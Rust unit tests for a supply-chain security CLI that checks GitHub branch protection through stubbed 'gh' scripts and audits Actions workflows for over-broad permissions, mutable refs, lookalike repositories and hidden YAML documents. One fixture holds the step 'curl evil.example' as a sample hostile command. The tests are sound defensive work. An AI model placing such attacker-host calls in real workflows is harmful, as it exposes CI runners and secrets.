        std::fs::create_dir(ctx.root.join(".github/workflows/not-a-file.yml")).unwrap();
        let result = verify_actions_control(&ctx, false);
        assert_eq!(result.outcome, Outcome::Fail);
        assert!(result.messages.iter().any(|m| m.contains("audit failed")));
    }

    #[test]
    fn verify_actions_control_passes_cleanly_on_freshly_bootstrapped_templates() {
        let (_d, ctx) = repo();
        // release-slsa.yml carries the one sanctioned tag-pin exception,
        // which surfaces as an Info finding even under the basic (non-
        // extended) audit — remove it so this exercises the true
        // zero-findings "all workflows pass" branch.
        std::fs::remove_file(ctx.root.join(".github/workflows/release-slsa.yml")).unwrap();
        let result = verify_actions_control(&ctx, false);
        assert_eq!(result.outcome, Outcome::Pass);
        assert!(result.messages[0].contains("all workflows pass"));
    }

    #[test]
    fn branch_protection_degrades_when_no_repo_is_configured() {
        let (_d, ctx) = repo();
        let cfg = ctx.require_config().unwrap();
        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Degraded);
        assert!(result.messages[0].contains("no GitHub repo configured"));
    }

    /// Regression (C4): when the rules API answers for NOT ONE configured
    /// branch, every rule check inside the loop was skipped — nothing about
    /// branch protection was read. The failing-query arm pushed a message and
    /// `continue`d without touching `outcome`, so the optimistic initial
    /// `Outcome::Pass` survived and `sscsb verify --strict branch-protection`
    /// exited 0 against a repo slug that does not even exist. "I could not
    /// check" must report DEGRADED.
    #[test]
    fn branch_protection_degrades_when_not_one_branch_could_be_queried() {
        let lock = env_lock();
        lock.fake_tool(
            "gh",
            "#!/bin/sh\necho 'gh: Not Found (HTTP 404)' 1>&2\nexit 1\n",
        );

        let (_d, ctx) = crate::testutil::repo_with_gh_repo("acme/does-not-exist", "main");
        let cfg = ctx.require_config().unwrap();
        let result = verify_branch_protection(&ctx, cfg);

        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
        assert!(
            result
                .messages
                .iter()
                .any(|m| m.contains("could not query rules API")),
            "the per-branch failure must still be reported: {:?}",
            result.messages
        );
        assert!(
            result
                .messages
                .iter()
                .any(|m| m.contains("NOTHING VERIFIED")
                    && m.contains("0 of 1 configured protected branch")),
            "the verdict must say nothing was verified: {:?}",
            result.messages
        );
    }

    /// An empty `protected_branches` list means the loop body never runs, which
    /// is likewise "nothing verified" rather than "all clear".
    #[test]
    fn branch_protection_degrades_when_no_protected_branches_are_configured() {
        let lock = env_lock();
        // `gh` must resolve for the check under test to be reached at all.
        lock.fake_tool("gh", "#!/bin/sh\necho '[]'\nexit 0\n");

        let (_d, ctx) = crate::testutil::repo_with_gh_repo("acme/demo", "main");
        let cfg_text = std::fs::read_to_string(ctx.config_path())
            .unwrap()
            .replace("protected_branches = [\"main\"]", "protected_branches = []");
        std::fs::write(ctx.config_path(), cfg_text).unwrap();
        let ctx = Ctx::discover(&ctx.root).unwrap();
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
        assert!(result.messages[0].contains("no protected branches configured"));
    }

    /// End-to-end matrix: one branch with every rule present (all ✓ +
    /// deletion protection), one branch with gaps (mixed ✓/MISSING → Fail),
    /// and one branch whose rules-API query itself fails (404-shaped) — all
    /// driven through a scripted `gh` stub so the assertions are
    /// deterministic and don't depend on live GitHub state.
    #[test]
    fn branch_protection_full_matrix_via_stubbed_gh() {
        let lock = env_lock();
        let script = r#"#!/bin/sh
case "$2" in
    */rules/branches/full)
        echo '[{"type":"pull_request"},{"type":"non_fast_forward"},{"type":"required_signatures"},{"type":"required_status_checks"},{"type":"deletion"}]'
        exit 0
        ;;
    */rules/branches/gaps)
        echo '[{"type":"deletion"}]'
        exit 0
        ;;
    */rules/branches/missing)
        echo "HTTP 404: Not Found" 1>&2
        exit 1
        ;;
    *)
        echo '[]'
        exit 0
        ;;
esac
"#;
        lock.fake_tool("gh", script);

        let (_d, ctx) = repo();
        let cfg_text = std::fs::read_to_string(ctx.config_path())
            .unwrap()
            .replace(
                "protected_branches = [\"main\", \"master\"]",
                "protected_branches = [\"full\", \"gaps\", \"missing\"]",
            )
            .replace(
                "# github_repo = \"owner/repo\"  # set to enable GitHub API checks",
                "github_repo = \"acme/demo\"",
            );
        std::fs::write(ctx.config_path(), cfg_text).unwrap();
        let ctx = Ctx::discover(&ctx.root).unwrap();
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Fail, "{:?}", result.messages);

        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("full: required pull requests ✓")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("full: force-push blocking ✓")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("full: required signed commits ✓")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("full: required status checks ✓")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("full: deletion protection ✓")));

        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("gaps: MISSING required pull requests")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("gaps: MISSING force-push blocking")));

        assert!(result.messages.iter().any(|m| m.contains("missing")
            && m.contains("could not query rules API")
            && m.contains("branch may not exist on the remote")));
    }

    /// A bootstrapped repo whose config names `branches` as protected and
    /// `acme/demo` as the GitHub repo, so the stubbed `gh` is what answers.
    fn ctx_with_protected_branches(branches: &str) -> (tempfile::TempDir, Ctx) {
        let (d, ctx) = repo();
        let cfg_text = std::fs::read_to_string(ctx.config_path())
            .unwrap()
            .replace(
                "protected_branches = [\"main\", \"master\"]",
                &format!("protected_branches = [{branches}]"),
            )
            .replace(
                "# github_repo = \"owner/repo\"  # set to enable GitHub API checks",
                "github_repo = \"acme/demo\"",
            );
        std::fs::write(ctx.config_path(), cfg_text).unwrap();
        let ctx = Ctx::discover(&ctx.root).unwrap();
        (d, ctx)
    }

    /// The three-read stub: `classic` is protected only the classic way
    /// (rulesets `[]`, admin read succeeds); `locked` is protected but the
    /// token is not admin (rulesets `[]`, classic 404, public flag `true`);
    /// `open` is genuinely unprotected (rulesets `[]`, classic 404, flag
    /// `false`); `ruled` has rulesets and a classic endpoint that refuses.
    /// `*/rules/branches/X` precedes `*/branches/X` because both patterns
    /// end the same way.
    const THREE_READ_GH: &str = r#"#!/bin/sh
case "$2" in
    */rules/branches/classic)
        echo '[]'
        exit 0
        ;;
    */branches/classic/protection)
        echo '{"required_status_checks":{"strict":true,"contexts":["ci"]},"enforce_admins":{"enabled":true},"required_pull_request_reviews":{"dismiss_stale_reviews":true,"require_code_owner_reviews":true,"required_approving_review_count":1,"require_last_push_approval":true},"required_signatures":{"enabled":true},"allow_force_pushes":{"enabled":false},"allow_deletions":{"enabled":false}}'
        exit 0
        ;;
    */rules/branches/locked)
        echo '[]'
        exit 0
        ;;
    */branches/locked/protection)
        echo "HTTP 404: Not Found (https://api.github.com/repos/acme/demo/branches/locked/protection)" 1>&2
        exit 1
        ;;
    */branches/locked)
        echo '{"name":"locked","protected":true}'
        exit 0
        ;;
    */rules/branches/open)
        echo '[]'
        exit 0
        ;;
    */branches/open/protection)
        echo "HTTP 404: Branch not protected" 1>&2
        exit 1
        ;;
    */branches/open)
        echo '{"name":"open","protected":false}'
        exit 0
        ;;
    */rules/branches/ruled)
        echo '[{"type":"pull_request","parameters":{"dismiss_stale_reviews_on_push":true,"required_approving_review_count":0}},{"type":"non_fast_forward"},{"type":"required_signatures"},{"type":"required_status_checks","parameters":{"strict_required_status_checks_policy":true}},{"type":"deletion"}]'
        exit 0
        ;;
    */branches/ruled/protection)
        echo "HTTP 403: Resource not accessible by integration" 1>&2
        exit 1
        ;;
    */rules/branches/renamed)
        echo '[]'
        exit 0
        ;;
    */branches/renamed/protection)
        echo "gh: Branch not found (HTTP 404)" 1>&2
        exit 1
        ;;
    */branches/renamed)
        echo '{"name":"main","protected":true}'
        exit 0
        ;;
    *)
        echo "HTTP 404: Not Found" 1>&2
        exit 1
        ;;
esac
"#;

    /// ISC-11: a branch protected ONLY the classic way answers `[]` on the
    /// rulesets API. The classic endpoint is read and translated, so every
    /// rule and every Scorecard knob scores exactly as a ruleset would — the
    /// live bug (a fully protected branch scoring as unprotected) is closed.
    #[test]
    fn branch_protection_reads_classic_protection_when_rulesets_are_empty() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);
        let (_d, ctx) = ctx_with_protected_branches("\"classic\"");
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
        for needle in [
            "classic: no rulesets — read via classic branch protection",
            "classic: required pull requests ✓",
            "classic: force-push blocking ✓",
            "classic: required signed commits ✓",
            "classic: required status checks ✓",
            "classic: deletion protection ✓",
            "classic: Scorecard — stale-review dismissal ✓",
            "classic: Scorecard — ≥1 required approving review ✓",
            "classic: Scorecard — code-owner review ✓",
            "classic: Scorecard — last-push approval ✓",
            "classic: Scorecard — branch-up-to-date (strict) ✓",
        ] {
            assert!(
                result.messages.iter().any(|m| m.contains(needle)),
                "missing {needle:?} in {:?}",
                result.messages
            );
        }
        assert!(!result.messages.iter().any(|m| m.contains("MISSING")));
    }

    /// ISC-12: rulesets present → the classic endpoint is never consulted,
    /// so its 403 cannot touch the verdict, and no classic surface is named.
    #[test]
    fn branch_protection_rulesets_stand_when_classic_endpoint_refuses() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);
        let (_d, ctx) = ctx_with_protected_branches("\"ruled\"");
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("ruled: required pull requests ✓")));
        assert!(!result.messages.iter().any(|m| m.contains("classic")));
    }

    /// ISC-47 (a): rulesets `[]`, classic 404, public record `protected:
    /// true` — protection exists but is unreadable with this token. That is
    /// Degraded with the flag named, never Pass from a flag and never Fail.
    #[test]
    fn branch_protection_degrades_when_protected_but_unreadable() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);
        let (_d, ctx) = ctx_with_protected_branches("\"locked\"");
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
        assert!(result.messages.iter().any(|m| m.contains("locked:")
            && m.contains("`protected: true`")
            && m.contains("admin token")
            && m.contains("UNVERIFIED")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("1 protected branch(es) could not be read")));
        assert!(!result.messages.iter().any(|m| m.contains("MISSING")));
    }

    /// ISC-47 (b): rulesets `[]`, classic 404, public record `protected:
    /// false` — genuinely unprotected, so every rule is MISSING and the
    /// control Fails, with the flag named so the reader knows all three
    /// surfaces were consulted.
    #[test]
    fn branch_protection_fails_when_public_record_says_unprotected() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);
        let (_d, ctx) = ctx_with_protected_branches("\"open\"");
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Fail, "{:?}", result.messages);
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("open:") && m.contains("`protected: false`")));
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("open: MISSING required pull requests")));
    }

    /// A real gap on one branch outranks an unreadable other: Fail, not
    /// Degraded — the unreadable branch is still reported.
    #[test]
    fn branch_protection_fail_outranks_unreadable() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);
        let (_d, ctx) = ctx_with_protected_branches("\"locked\", \"open\"");
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Fail, "{:?}", result.messages);
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("locked:") && m.contains("`protected: true`")));
    }

    /// Seen live (2026-09-07): GitHub answers `GET /branches/master` on a repo
    /// with no `master` with the DEFAULT branch's record, `protected: true`
    /// and all — a followed redirect. The flag must be trusted only when the
    /// record names the branch asked for; a redirect is "not found", it is
    /// not "protected but unreadable", and alone it verifies nothing.
    #[test]
    fn branch_protection_public_record_redirect_is_not_found() {
        let lock = env_lock();
        lock.fake_tool("gh", THREE_READ_GH);

        let (_d, ctx) = ctx_with_protected_branches("\"classic\", \"renamed\"");
        let cfg = ctx.require_config().unwrap();
        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("renamed: not found on the remote")
                && m.contains("answered for `main` instead")));
        assert!(!result
            .messages
            .iter()
            .any(|m| m.contains("renamed:") && m.contains("protected: true")));

        let (_d, ctx) = ctx_with_protected_branches("\"renamed\"");
        let cfg = ctx.require_config().unwrap();
        let result = verify_branch_protection(&ctx, cfg);
        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
        assert!(result
            .messages
            .iter()
            .any(|m| m.contains("NOTHING VERIFIED")));
    }

    /// Classic translation is exact for the "everything off" shape too:
    /// `allow_*` toggles on and no review object mean no rules at all.
    #[test]
    fn classic_protection_translation_handles_permissive_shape() {
        let permissive = serde_json::json!({
            "allow_force_pushes": {"enabled": true},
            "allow_deletions": {"enabled": true},
            "required_signatures": {"enabled": false}
        });
        assert!(classic_protection_as_rules(&permissive).is_empty());

        let checks_only = serde_json::json!({
            "required_status_checks": {"strict": false, "contexts": []}
        });
        let rules = classic_protection_as_rules(&checks_only);
        let types: Vec<&str> = rules.iter().filter_map(|r| r["type"].as_str()).collect();
        assert_eq!(
            types,
            ["non_fast_forward", "deletion", "required_status_checks"]
        );
        assert_eq!(
            rules[2]["parameters"]["strict_required_status_checks_policy"],
            serde_json::Value::Bool(false)
        );
    }

    #[test]
    fn branch_protection_reports_scorecard_granular_fields() {
        let lock = env_lock();
        // "aligned": every Scorecard knob set. "gaps2": all off.
        let script = r#"#!/bin/sh
case "$2" in
    */rules/branches/aligned)
        echo '[{"type":"pull_request","parameters":{"dismiss_stale_reviews_on_push":true,"require_code_owner_review":true,"require_last_push_approval":true,"required_approving_review_count":1}},{"type":"non_fast_forward"},{"type":"required_signatures"},{"type":"required_status_checks","parameters":{"strict_required_status_checks_policy":true}}]'
        exit 0
        ;;
    */rules/branches/gaps2)
        echo '[{"type":"pull_request","parameters":{"dismiss_stale_reviews_on_push":false,"require_code_owner_review":false,"require_last_push_approval":false,"required_approving_review_count":0}},{"type":"non_fast_forward"},{"type":"required_signatures"},{"type":"required_status_checks","parameters":{"strict_required_status_checks_policy":false}}]'
        exit 0
        ;;
    *)
        echo '[]'
        exit 0
        ;;
esac
"#;
        lock.fake_tool("gh", script);

        let (_d, ctx) = repo();
        let cfg_text = std::fs::read_to_string(ctx.config_path())
            .unwrap()
            .replace(
                "protected_branches = [\"main\", \"master\"]",
                "protected_branches = [\"aligned\", \"gaps2\"]",
            )
            .replace(
                "# github_repo = \"owner/repo\"  # set to enable GitHub API checks",
                "github_repo = \"acme/demo\"",
            );
        std::fs::write(ctx.config_path(), cfg_text).unwrap();
        let ctx = Ctx::discover(&ctx.root).unwrap();
        let cfg = ctx.require_config().unwrap();

        let result = verify_branch_protection(&ctx, cfg);
        let m = |s: &str| result.messages.iter().any(|x| x.contains(s));

        // aligned branch: all Scorecard ✓
        assert!(m("aligned: Scorecard — stale-review dismissal ✓"));
        assert!(m("aligned: Scorecard — ≥1 required approving review ✓"));
        assert!(m("aligned: Scorecard — code-owner review ✓"));
        assert!(m("aligned: Scorecard — last-push approval ✓"));
        assert!(m("aligned: Scorecard — branch-up-to-date (strict) ✓"));

        // gaps2 branch: the solo-safe gap + the solo-capped tier both surfaced
        assert!(m("gaps2: Scorecard gap — stale-review dismissal off"));
        assert!(m("gaps2: Scorecard gap — ≥1 required approving review off"));
        assert!(m("gaps2: Scorecard gap — code-owner review off"));
        assert!(m("gaps2: Scorecard gap — last-push approval off"));
        assert!(m("gaps2: Scorecard gap — status checks not strict"));
        assert!(result
            .messages
            .iter()
            .any(|x| x.contains("cannot self-approve")));
    }

    /// Wrap a job-level permissions block in a workflow that is otherwise
    /// clean, so the only findings under test are the permissions ones.
    fn job_perms(block: &str) -> String {
        format!(
            "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
             runs-on: ubuntu-latest\n    permissions:\n{block}    steps:\n      - run: echo hi\n"
        )
    }

    /// M12: "least privilege" was the literal string `write-all`. A job that
    /// enumerates write on scope after scope is write-all with extra typing,
    /// and it was not flagged at all.
    #[test]
    fn write_all_spelled_out_scope_by_scope_is_still_write_all() {
        let wf = job_perms(
            "      contents: write\n      packages: write\n      id-token: write\n      \
             actions: write\n      issues: write\n",
        );
        let f = audit_workflow("w.yml", &wf, false).unwrap();
        assert!(
            f.iter().any(|x| x.severity == Severity::Error
                && x.message.contains("job `b`")
                && x.message.contains("write on 5")),
            "an enumerated write-all must be the same finding as the literal one: {f:?}"
        );
    }

    /// The guard on the rule above: the most privileged job sscsb itself ships
    /// — a release that pushes the release, publishes a package, mints an OIDC
    /// token and writes an attestation — must stay silent. A rule that fails
    /// ordinary correct workflows is worse than the hole it closes.
    #[test]
    fn a_legitimate_release_grant_is_not_flagged() {
        for block in [
            // sscsb's own release.yml job.
            "      contents: write\n      id-token: write\n      attestations: write\n",
            // ...plus publishing a package: four scopes, still one coherent job.
            "      contents: write\n      packages: write\n      id-token: write\n      \
             attestations: write\n",
            // A single write scope is what least privilege LOOKS like.
            "      contents: write\n",
            "      security-events: write\n",
        ] {
            let f = audit_workflow("w.yml", &job_perms(block), false).unwrap();
            assert!(f.is_empty(), "no finding is owed for `{block}`: {f:?}");
        }
    }

    /// M12: `actions: write` reaches outside the job's own build — it can
    /// replace ANOTHER run's artifacts and caches. Combined with the right to
    /// publish, one compromised step can poison the build and ship the result.
    #[test]
    fn ci_tampering_rights_combined_with_publishing_rights_are_flagged() {
        let f = audit_workflow(
            "w.yml",
            &job_perms("      actions: write\n      contents: write\n"),
            false,
        )
        .unwrap();
        assert!(
            f.iter().any(|x| x.severity == Severity::Warn
                && x.message.contains("job `b`")
                && x.message.contains("actions: write")),
            "{f:?}"
        );

        // Narrowness: each half alone is a job someone legitimately runs.
        for block in ["      actions: write\n", "      contents: write\n"] {
            let f = audit_workflow("w.yml", &job_perms(block), false).unwrap();
            assert!(f.is_empty(), "`{block}` alone owes no finding: {f:?}");
        }
    }

    /// M12: a write scope at the TOP level is handed to every job in the file.
    /// Which jobs actually inherit it is the difference between a live
    /// over-grant and a latent one, so the finding says which it is.
    #[test]
    fn top_level_write_scopes_are_reported_by_who_inherits_them() {
        // `test` inherits `contents: write` to run `cargo test`.
        let wf = "on: push\npermissions:\n  contents: write\njobs:\n  \
                  release:\n    runs-on: ubuntu-latest\n    permissions:\n      \
                  contents: write\n    steps:\n      - run: gh release create\n  \
                  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(
            f.iter().any(|x| x.severity == Severity::Warn
                && x.message.contains("contents: write")
                && x.message.contains("`test`")),
            "the inheriting job must be named: {f:?}"
        );

        // Every job overrides it: the grant is inert today, but it is still
        // the default the next job added will get. Reported, not failed.
        let wf = "on: push\npermissions:\n  contents: write\njobs:\n  \
                  release:\n    runs-on: ubuntu-latest\n    permissions:\n      \
                  contents: write\n    steps:\n      - run: gh release create\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(
            f.iter()
                .any(|x| x.severity == Severity::Info
                    && x.message.contains("overridden by every job")),
            "{f:?}"
        );

        // A read-only top level is the shape being asked for.
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  \
                  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n";
        assert!(audit_workflow("w.yml", wf, false).unwrap().is_empty());
    }

    /// M13(a): the tag-pin exception was a `starts_with` PREFIX test, so any
    /// repository whose path merely begins with the sanctioned one inherited
    /// permission to use a mutable ref. The exception belongs to exactly one
    /// repository.
    #[test]
    fn tag_pin_exception_does_not_extend_to_lookalike_repositories() {
        for lookalike in [
            "slsa-framework/slsa-github-generator-evil/.github/workflows/generator_generic_slsa3.yml",
            "slsa-framework/slsa-github-generator2",
        ] {
            let wf = format!(
                "on: push\npermissions: {{}}\njobs:\n  p:\n    permissions:\n      \
                 id-token: write\n    uses: {lookalike}@v2.1.0\n"
            );
            let f = audit_workflow("w.yml", &wf, false).unwrap();
            assert!(
                f.iter()
                    .any(|x| x.severity == Severity::Error && x.message.contains("mutable ref")),
                "`{lookalike}` is a different repository and must not inherit the tag-pin \
                 exception: {f:?}"
            );
        }

        // The genuine repository, and its reusable workflows, keep it.
        for genuine in [
            "slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml",
            "slsa-framework/slsa-github-generator",
        ] {
            let wf = format!(
                "on: push\npermissions: {{}}\njobs:\n  p:\n    permissions:\n      \
                 id-token: write\n    uses: {genuine}@v2.1.0\n"
            );
            let f = audit_workflow("w.yml", &wf, false).unwrap();
            assert!(
                f.iter().all(|x| x.severity != Severity::Error),
                "the sanctioned exception must survive: {f:?}"
            );
            assert!(f.iter().any(|x| x.message.contains("tag-pinned by design")));
        }
    }

    /// M13(b): the credential-persistence check matched the literal string
    /// `actions/checkout@`, so a fork or re-publish of the same action — which
    /// leaves the same GITHUB_TOKEN on disk — was never asked the question.
    #[test]
    fn checkout_credential_check_covers_forks_and_republished_actions() {
        for fork in [
            "myorg/checkout",
            "myorg/checkout-action",
            "MyOrg/Checkout",
            "myorg/action-checkout",
        ] {
            let wf = format!(
                "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
                 runs-on: ubuntu-latest\n    steps:\n      \
                 - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920\n      \
                 - uses: {fork}@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n"
            );
            let f = audit_workflow("w.yml", &wf, true).unwrap();
            assert!(
                f.iter()
                    .any(|x| x.message.contains("persist-credentials") && x.message.contains(fork)),
                "`{fork}` checks out code with the same token exposure: {f:?}"
            );
        }

        // Setting it still silences the check, whoever publishes the action.
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
                  runs-on: ubuntu-latest\n    steps:\n      \
                  - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920\n      \
                  - uses: myorg/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n        \
                  with:\n          persist-credentials: false\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(f.is_empty(), "no finding is owed here: {f:?}");

        // And an action that merely mentions checkout in a longer name is not
        // a checkout — this rule must not invent findings.
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
                  runs-on: ubuntu-latest\n    steps:\n      \
                  - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920\n      \
                  - uses: myorg/checkout-secrets-to-disk@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(f.is_empty(), "not a checkout action: {f:?}");
    }

    /// The checkout matcher reads the REPOSITORY name, so a `uses:` that names
    /// no repository is not a checkout however it is spelled.
    #[test]
    fn the_checkout_matcher_needs_a_repository_not_just_a_word() {
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
                  runs-on: ubuntu-latest\n    steps:\n      \
                  - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920\n      \
                  - uses: checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(
            f.is_empty(),
            "a bare `checkout@sha` names no repository to check out from: {f:?}"
        );
    }

    /// A job carrying BOTH `uses:` and `steps:` is not a reusable-workflow job
    /// — and until GitHub rejects it, the steps are what would run. The
    /// predecessor skipped any job with a `uses:` key outright, so adding one
    /// line to a job removed it from the harden-runner check entirely.
    #[test]
    fn a_job_with_both_uses_and_steps_is_not_exempt_from_harden_runner() {
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    \
                  runs-on: ubuntu-latest\n    uses: some/reusable.yml@v1\n    steps:\n      \
                  - run: curl evil.example\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(
            f.iter()
                .any(|x| x.message.contains("job `b`") && x.message.contains("harden-runner")),
            "a `uses:` key must not buy a job with steps an exemption: {f:?}"
        );
    }

    #[test]
    fn an_empty_composite_action_file_is_reported_as_empty() {
        let f = audit_action_file("a.yml", "# nothing but a comment\n").unwrap();
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].severity, Severity::Warn);
        assert!(f[0].message.contains("empty action file"));
    }

    /// M13(c): only `docs.first()` was ever audited, so everything after a
    /// `---` separator was reported as clean without being looked at.
    #[test]
    fn every_yaml_document_in_a_workflow_file_is_audited() {
        let wf = format!("{PINNED_OK}---\non: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n");
        let f = audit_workflow("w.yml", &wf, false).unwrap();
        assert!(
            f.iter().any(|x| x.severity == Severity::Error
                && x.message.contains("mutable ref")
                && x.message.contains("document 2")),
            "the second document must be audited and located: {f:?}"
        );
        assert!(
            f.iter()
                .any(|x| x.severity == Severity::Warn && x.message.contains("2 YAML documents")),
            "the reader must be told the file is multi-document: {f:?}"
        );

        // A trailing separator is an empty document, not a hidden workflow.
        let f = audit_workflow("w.yml", &format!("{PINNED_OK}---\n"), true).unwrap();
        assert!(f.is_empty(), "a trailing `---` owes no finding: {f:?}");

        // A file that is nothing BUT a separator declares no workflow at all —
        // it used to audit an empty document and report the file as clean.
        let f = audit_workflow("w.yml", "---\n", false).unwrap();
        assert_eq!(f.len(), 1, "{f:?}");
        assert!(f[0].message.contains("empty workflow file"));
    }

    /// Composite action definitions hide the same way.
    #[test]
    fn every_yaml_document_in_a_composite_action_is_audited() {
        let action = "name: setup\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n---\nname: shadow\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n";
        let f = audit_action_file("a.yml", action).unwrap();
        assert!(
            f.iter().any(|x| x.severity == Severity::Error
                && x.message.contains("mutable ref")
                && x.message.contains("document 2")),
            "{f:?}"
        );
    }

    #[test]
    fn sha_and_semver_helpers() {
        assert!(is_full_sha("9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"));
        assert!(!is_full_sha("v4"));
        assert!(!is_full_sha("9c091bb"));
        assert!(is_semver_tag("v2.1.0"));
        assert!(!is_semver_tag("v2.1"));
        assert!(!is_semver_tag("2.1.0"));
    }
}
